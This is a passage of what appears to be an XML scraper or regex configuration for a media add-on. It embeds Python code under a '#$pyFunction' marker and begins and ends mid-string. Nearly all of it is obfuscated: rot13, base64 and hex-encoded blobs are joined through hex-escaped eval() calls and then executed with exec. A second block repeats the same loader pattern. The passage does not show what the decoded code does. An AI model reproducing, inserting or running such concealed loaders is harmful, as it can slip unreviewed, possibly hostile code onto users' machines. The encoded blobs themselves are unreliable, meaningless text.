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'
oracle = 'E2YTQ5NDI0NjUzNjU3MjU1MmYyYjUwNmIyZjU1NmI0Zjc2Nzk2ODRiNzc2MzMzNjM0ODc3NWE0NDZmNGI2NDQ4Nzg2YjdhNmU0Mzc5MzE1NTc3NDI1NDcxNjg1YTc5NTY0ZDU1MzE3MzQ2NGE2ZTY5NjQzMTY0NGQ2NzM4Nzc2NTRmMzAzNjYxNDM0NDM0MmY3MjZmNzE0NDQ0NTA1ODY0Mzk3ODQ5NzM1NzRhNmM1MjMwNzQ0ZjMyNzQzMjRmNjgzNDM3NDE3NzYzNjQ0NDZhNzY1OTMwMzQ1MDcwMzA0MjMyNjg2ZjU1MmYzNjVhNGM3MjMwNzk1YTU4MzI1MTU5MmI0ZDZhNDY2MjJiMzI2NTU3NTM0YTUyNGM2YTRhMzI0ZDQ0MmIzOTY3NzQzMTZkNTQ3MzdhNzY3MjZiNmQzMzQ2Mzg1NDY2NWE2YzMxNGQ3NzYxNDc1OTRjNzE2MTQ0MzE0Zjc0NmQ3NjRiNjQzMzU0NmU3NzQyNGQzMjM1NGY2NzRmNzU3OTQ1NmE3NzMwMzU1OTZhNGM3MTU0NGE2Mjc0NTE2YjU5MzM2Nzc5NWE3YTJiMzA3NTdhNTY3MTQ0NzM2NzY0NzE1MzJiNzA0MjM4NjQ2NjUxNDk2ZTZmMmI2MjZlNzA3NTM2NTU2ZDcwNjc0ZDc3Nzg2ZDY0NDU1NDczNTg1MDczNjUzNjM2NDM0NDRhNDM0NDQ2NjU1MDZhNzY1MTM4NzMzNzRmNTU1ODYzNDE2ZjJiMzU1MTYxNmUzMzc5NWEyYjY2NDg2NTVhNmY3ODRmNjI0YzZhNmU3NTY5NGY1NDQ4NjM2ZDczNGM2NjQzNTM1YTMyNjQ0NjUwNTc2YjYyNDQ0OTVhMzg0YjJmMzI2YjM4Mzk3NTQxN2EzMDU5NTQyZjcwNmI0NzRkNmI3MzUwNDQ3MDUyMmIzODQ2NTUzNjQ1Mzc0ZjU5NmQ2NTcxNGY3OTZhMzg3NjUzNGE1NDY3NzY1ODUyNTM2NjY1NjE1MTY0NGMyYjZhNTIyYjRkNmM0NzU5NjM2MzRkNWE2ZjRhNDQ3MzYzNGQ2ODZhNDU2ZDJmNmQ1OTcyMzU2ZDQ4NTIzMDY0NGU1YTZmNTE0ZDZjNjI2MTUwNmU1MTZiNWE0NTRmNjg2ZTY1NjU3OTRiNTIzOTY3NDQyZjM2NGE3YTY0NDI0NzRlNDM2ODMwNjg0Zjc0NTgzODMwMzAzNzQ2NGY0YjRjNTQ1NjMyNTQ2ZDU4NGM0OTYyMzc0ODZhNTE0OTVhNGM2ODQ3Njg2YjZlNjQ2YTc4NmI0OTc0NmE1YTQ1NDQzOTZiNjU0ZTVhNmI1NTQ2MmY0YTc0Njk2ZDc5NGYzMzM3MmIzNjQyNDQ1YTZiNjU3MDRmNTU2YTJiNDg2ZTJiNTc2YTQ1NzgzMDU2NDc1YTU1NTQzODVhNjk1NDU1NjY1MDRhNDI0MzZjNjIyYjM0NGUzNDMzNDI0YzJmMzc0ZjdhNTc2NjQ0MzU2ODRhNzc2ZjM1NmIzODYzMzkzNzUwNDkzMTUxMmI2OTc3NTczOTYxNGQ2ZDcxNzYzOTUyNjE2MTQ2NDQ0MTUzNWE0MzRmNjg0YzVhNzA2YjY0NDk2NjY0Njg1NDUxNWEzMDM4NzQ0MjUwNzMzMjQ3NTU1MDM5NGI0ZjZlNGI3YTUzNmYzMzc0N2E0ZTRiMzc0YTZjNGY3MTM5Njg1NTM2NTU3YTQ2Njk2YzU3NTc1MjMyNjE0NzU0MzczMDQzNmQ1Mzc1NjM3NDc0NjI1OTY2NzU0NDQzNmI2NjQ4NjU3NTQ0MzI1NzQ4NTgzNzQ0Nzk1OTQyNzUzNDQ4MzY2YjQ4NDczODU3NjczODRmNmU0Nzc1NTQyYjYxNTE3YTQ5NDI2ZDc0NDM3YTRlNTU0NTRhNjY3YTU0NTEzMDVhNDc2ZjMxNmIzODUwNzUzMjc0NDgzNTY3NTIzMDdhNzUzMTU4NGU0ZTQ1NGY2NjRjNDM1OTc1NjU0NTJmNDc2YzJmNzY2ZDdhNmYzNTMxNTM2MjZlNjM0YzM1NzE0YTRhNmE0ZDY1NmIzOTQ1Nzk0ODM0Nzc3YTM4NTUzNjZkNmIzODc3NjUzOTc5NzIzMzRkMzk2ZTQxMzQ3NzM5NmQ2ZTUyMzA3MTZkNTQzNTYyNjQzNzRhNmI3MDQ1NjI2OTdhNTM0ZTQ0NzA0ZjMxNjM0ZDYyMzUyYjQ0NGM3NDQ0NGQ2OTRhMzQ1NDc1NWE0NzRkMzI3NDMzMzI3MDQ3NTQ0OTU4NDQ1YTc5NWE0ZDRhMzk1MjM2NGQ3NTYzMzQ0MjMyNzYzOTZiNzY2ZTc2NGU3MzQzNGQ2NjUwNzQ2NzRjNGQ3MTMzNDEzODc4NjczMjZlMzg3ODQyNDEzNzJmNTk2YTMzMzI3MDU3NjE0YjQyNjQ2ODU3NjEzNzYxNmE1MjU5NjU1MDM5MmI0NzQzNjE3OTU2Nzc2YTc2MzUzMjU1NWE2YjU0NDk3MjQxNGQ1ODM3NGE2ODc4NDI3NDQ0NGQ2ZjQ1NzMzOTZkNTk3NjU4Nzg0ZTRlNWE0ZDM2NGQ2YTYzNzkyYjVhNTI0ZDMyNTk2ZDZjNmYyZjc5MzI0ZTY1NDg2ODM2NGQ0ZTRhNmI2ODc5Njk0NTJiNmI1ODYzNzIyYjcyNTY2YjY2NzU3NjM1NTg0NjU3NjE1YTYyNjY0YTQ4NDg0NTM4MzkzNDY1MzI0MTdhNmE1MzdhNDE1MDdhNDIyZjRiNWEyYjczNzg0YzY5NzY3MzY0MmI3NTc1MzQ1OTUxNTQ2YjRkMzkyZjUzMzkzMjUyNTU1MDcwNmI1NzM1Njk3NjM5Nzg2MzQ4NTM3YTQzNzg2YzYxNjE2MTQzNmQ0ZTc2NDEzMzJmNGI1NDM3NTM1MzZhNDg2YTUwNTA1MDVhNmE1MzRjNjUyZjY4MzIzMTQ4NTM0ODM1NGQ0ODMwMzY2ZjVhNGI0ZTY5Njc0NzU0NGM2ZjM5MzU1MDY0Nzg0YzcyNGQzMTMyNTE0Yjc5NTI3OTU0NTY1OTZiNzQ0YzU5NjQ0ZDcwNmQ1OTc3NDY2NjY2NmU3MTRjMmI1MTRkNDgyZjM3NmEzMzMyNDg2NDUyMzc3ODQxNTIzNDMwNDkzNTMzNDY2ZTMxMzk2Zjc1NDgzNzRhMmY1NTY0MzgzMDQ4MmI0ZDM3MmY0MjY3NjI0MjM5NGQ0ZjY1NTMzODYxNmQ2MTUzMmIzNjRiNGE0ODJiNzg3NDc3NzkzODc4Nzc0ODc3NDY2NjRmNjc3NjRlNGM1MTU4NGY0Nzc4NjkzNzU4NzQyYjYzNTY2Nzc4NmMyYjcwMzk0MjVhN2E2ODc1NjQ0YTY2NTI2NzUxNWE2NDc1MzQ0NDcyNDUzOTQ3NmQzMTY4NDc1ODQzN2E2YjMwMzQ3MDM1NGYzOTYyMzU2YzU0NDg1NzJiNTkzNTY2NTY2NTY3NTA3YTY2Njk1MzYzNTI2NTUxNjgzMzZkNGQ1YTM2NTg3YTRjNjY1OTM1MmY2NTJiNTI2OTU0NGQzMTczNzc2MjYzNGI0ZDMyNDU2YjZjNmM1NTZjNmYzNDZlMzgyYjc0NTkzMTRhMzk0ZDMwNTU2NzQ3NTM2YTRmN2E0Njc1NjQ2ODUwMzE2NTYxNjc1MzRjNDQ0ZjRmNmY3NjQ4NjE3ODYyMmI3MTc2NTEzMDUzNjI0NDM5MzY0Zjc1NDU0MzY0NGI0ZDJmNjU2YzJmNjM2YTcyNDE2ZTQ3NGM2ODc3NjM0ZjZjNGIzNTM3NGY1MjZlNmY2ODc2NzU0MTJmNjk3OTVhNDgzMzcyNzU1NDYzMzEzNDczNTczNTdhMmYyZjZhNjEyZjM4NTE2YzM4Njg0Yzc0NGE2NjRkNGI2NjJmNTA0YzQ1NTA0NjUzNTU1MTM2MmY3MTUwNDI0YzUzNjEzNDVhNTAzNzMwNjY0ZTYzNGU0OTRlNzA1MTM1NGM3OTQ2NDQ1YTU3NmUyZjJiNDc3NjQ3MzQ2NjUyNjc0MzcwNmU3NjMxNzM2OTQ4NmE0NDJmNmMzNTcyNmYyYjM2NDMzOTRkNzc0YjQ4NDc0ZTU2NmI3ODMxNzM1ODQ4NTA2ZjUzMzk1MjJiMzQ2Mjc4NDk1YTMxNDc2ZTZjNjIzNzc5NjM3OTY0NDc1MzJiMmI1NDM1MmY2NjQ2NmM2NzU4NmQ0Zjc1NzkzMzUyNjQ3MTcxNDU2ZTJmNjE2MjMzNTg1NTM3NDc1NDQ0NTA1OTRmNDI1NzY5Mzc2OTMxMzE1ODY1NTczNTY3NDk3Nzc2NDc1NDc1NzU1Njc3NGQ1NDZlMzEyZjMwNjU0NjYxNzA2MTc1NWE1NDMxNGI2NjZhMzU1Njc2N2E2NjZhMzU3MzdhNjQ2NTM5NzQ1MjZkNmI2MTMzN2EzNTcyNTQzNDRkN2E2MjM'
keymaker = '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'
zion = '\x72\x6f\x74\x31\x33'
neo = eval('\x6d\x6f\x72\x70\x68\x65\x75\x73\x20') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x74\x72\x69\x6e\x69\x74\x79\x2c\x20\x7a\x69\x6f\x6e\x29') + eval('\x6f\x72\x61\x63\x6c\x65') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6b\x65\x79\x6d\x61\x6b\x65\x72\x20\x2c\x20\x7a\x69\x6f\x6e\x29')
eval(compile(base64.b64decode(eval('\x6e\x65\x6f')),'<string>','exec'))

]]></expres>
<page></page>
</regex>
<regex>
<name>plugin</name>
<expres><![CDATA[#$pyFunction
url = '[busca.param3]'
import base64, codecs

morpheus = 'aW1wb3J0IGJhc2U2NCwgemxpYiwgY29kZWNzLCBiaW5hc2NpaSwgc2l4Cgptb3JwaGV1cyA9ICc2NTRhNzk3NDU3NDY3NDdhNmYzODY5NTM2Njc1Mzk2NjMwNTcyYjY1Njk1YTMwMzQ3NzU1NTgzNDc0NDM0YTMyNGU2NzQ5NWE3ODQ1NTU1NTRkNmY2OTRjNzE0YTY3NTg2YTQ3NTY2YjU1NDU2YzQ5NjI1YTZlNGM3MjM5Mzg3NjUzMzM1YTMzN2EzNDZkNGE2NjY0NmY0ODQyNTY0MzU2NmM1YTYzNzY3Mzc5NzEyZjMwNzE3NjZmNTQ3MDY1MzM3MjMwMmY2YzM5MzkzMzM5Mzc0OTJiNzYzMTY1NmMzNTU2MzMzMzJmMzg2YjU3NjM0Yzc0MzEyYjY0MmYzMzJiMzk2MzJiNzY2NDMyNTc3NTM5NmIyYjM2NzIzMzY5NGY3NjM2MmIzMDU2NDE3MzY2MmI2ZTZmNmU2ODcxMzUzNDM3NjU3NDQzNmQzNzYzMzg0NDM2NjY2NzU5NjY0NjYxMzU2NzYyNmQ3NzM2Mzc2MzM5NDg1NzZjNDg1NzU5NTA2NDY2NjU0NzY0NTgzMzcwNWE0NzZmMzE2ZDZlNTA3NjQxNjI0ZTRhNzY0MTJiNmU1NjY3Mzg3NDM2NDI0NjRkNDQzNTRmMzA0NDMwNTc2ODczMzY2ZTQzNGYyYjYxNjI1MTZkNTY1NDY5Nzk2NjcyMzg1NDMzNzk0YTY4NWE3MzUzNjg1NzM4NDczMDc4MzQ0YjZiNzY2OTMxMzk0MTcxNzg3MTRhNGE0NDU0NTk3ODcwNWE2ODM0NDc3YTcxMzI2NzZkMzgzMTYyNDM3MTc0NmQ0YTY3NTczNTZhNjI2YjRmNGY1MzZiNDg2NTY5NDQ3MjUzNmQ0NjY2NmIyYjQ2NTA1MTUwNzI0ZDYzNjI0NzYzNDc0YzcxNGY2ZjZjNjc3NTM5NDI3MDZhNDc3OTc2NGM1YTQ5NzI1OTQ0MmI0NDZlMzY2MTc5Njg2YjM5NTk0NDMzNzU3NzQ5MmIzMzM3NzIzMjQ2Njk0OTY3Mzc1MzQxNTc3MzRlNDczOTY4NmI1NDJiNzU0NTU5NTQzMzY5NmQ2MjY5NDEzMzQxNTQzNzQ0NWE3MzM4MmY1NDYxNTc0Yjc0Nzk3MTZjNGM0MjRhNGU2NTY4NTQ1MTM1NDY0ZjZmNjM1NjQ3N2E0MzczNjMyYjc2NDI1NTU3NTY0ZjUxNDg1MjMxMzY1YTcxNDU1NDRiNjE0NjU2NTE2MjJiNGUzNzMyNDk0ZDZiMzM1YTY5NTUzNDUyMzU3NzY3MmIyYjYxNTI2OTMzNTk2NzQ1MzU2YTU0NjY1MTY4NjI2ZDUxMzk0NTJiNmQ1NjY5NTM0NTY4MzY2NTc4MzU2ZTZiNjY0MzY4NzMzMjZmMzU2ZTQ1NzU2ZjZiNGQ1OTQxNjczOTc4NTk0MjU5Njc1NTY0NDI0ZjQzNmI2MzRkNjM0ZDJmNzI1NzY4NDk2ZTM2NjM1NzUzNTQ0NzQ0NDQ2NjY5NDY3NjQ0NmE0NjY0NTA0ZDZhMzE1NjZkNDM2NDMyNDQ0YzY3NTc2NDZmNmI2MjMwNDM2MzU2NjQ0YjZiNjM1MTQ4MzY0YTM3NTc0NjcxMzE0NDQ4NGM0MjMxMzg3ODU2MmI0ZTQ0NTgzMDRkNjU1Mzc1Njg2NzMzNDU1OTUxNDg0YzY4NGYzOTZjNDg0ODQ5NjU0ZjQ0NTg1MjQ1NDQ2MTMyNjg3NjU3NDUzMTYzNjQzNjMyNGM1MDM0Njc1ODQzNTUzOTU3NDg1NjRmNmQ3NjY5NmM3NTcxNDE2YjY0Mzk0ZTcwNGI3Nzc0MzY0MjQ1NDYzODZiMzM3ODZmNDg2MTYxNDM3NjM2MzA2OTRjNjU2MTQ1NTEzNjM4NzE1ODcyNDM0NzM3NTk0NzM0NDk2MzU5NjU0OTUwMzg1NDY4Njc2YTQ4NTY2NzUwNzY1YTU0NDg0Mjc2NTg1NTQ5NGUzNjQ3MzY3MjRjNTc0NTU1Mzg2YTM4MzA0NjMxMzU3NDY5NTQ3MjQxNTA3OTZhMzI3MjU0Mzg3MDQxNTg3ODQzNGY2OTY5NTc0YzQ3NTUyYjUwNDk0ZDJiNzA1OTcwNWE3MDQ1NTg1NTRkNTAyYjY1NzU2OD